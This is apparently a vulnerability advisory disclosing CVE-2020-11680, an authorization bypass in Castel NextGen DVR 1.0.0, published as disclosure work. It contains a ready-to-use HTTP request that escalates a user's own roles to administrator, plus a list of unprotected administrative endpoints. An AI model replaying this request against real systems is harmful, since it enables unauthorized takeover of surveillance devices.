An Authorization Bypass, CVE-2020-11680, was identified on **Castel NextGen DVR** version 1.0.0 due to functionality reserved for an Administrator not verifying user permissions when the functionality is called.

## Timeline

* Issue Disclosed: 3 Jun 2020 - [Blog post](https://www.securitymetrics.com/blog/attackers-known-unknown-authorization-bypass)

## Description

A malicious user can craft a request which calls the functionality to modify the roles associated with their account, the request would be similar to:

~~~
POST /Administration/Users/Edit/:ID HTTP/1.1
Host: $RHOST
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: $REVIEWER_COOKIES
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 349

UserId=:ID&Email=bypass%40test.com&FirstName=bypass&LastName=bypass&LDAPUser=false&Roles%5B0%5D.RoleId=1&Roles%5B0%5D.IsSelected=true&Roles%5B0%5D.IsSelected=false&Roles%5B1%5D.RoleId=3&Roles%5B1%5D.IsSelected=true&Roles%5B1%5D.IsSelected=false&Roles%5B2%5D.RoleId=5&Roles%5B2%5D.IsSelected=true&Roles%5B2%5D.IsSelected=false&Locked=false
~~~

The request returns a generic error:

![](error.png)

However, the action is performed.

The following functionality was vulnerable:

~~~
POST /Administration/Alerts/Create          POST /Administration/Alerts/Delete
POST /Administration/Archiving/             POST /Administration/Archiving/Create
POST /Administration/Archiving/Delete       POST /Administration/FileStores/Create
POST /Administration/FileStores/Delete      POST /Administration/LDAP
POST /Administration/Roles/Create           POST /Administration/Roles/Edit/:RoleId
POST /Administration/Roles/Delete           POST /Administration/SMTP
POST /Administration/Users/Create           POST /Administration/Users/Edit/:UserId
POST /Administration/Users/ResetPassword    POST /Administration/FileStores/Edit/:FileStoreId
POST /Administration/Archiving/Edit/:ArchiveRuleId
POST /Administration/Alerts/Edit/:EventAlertId
~~~
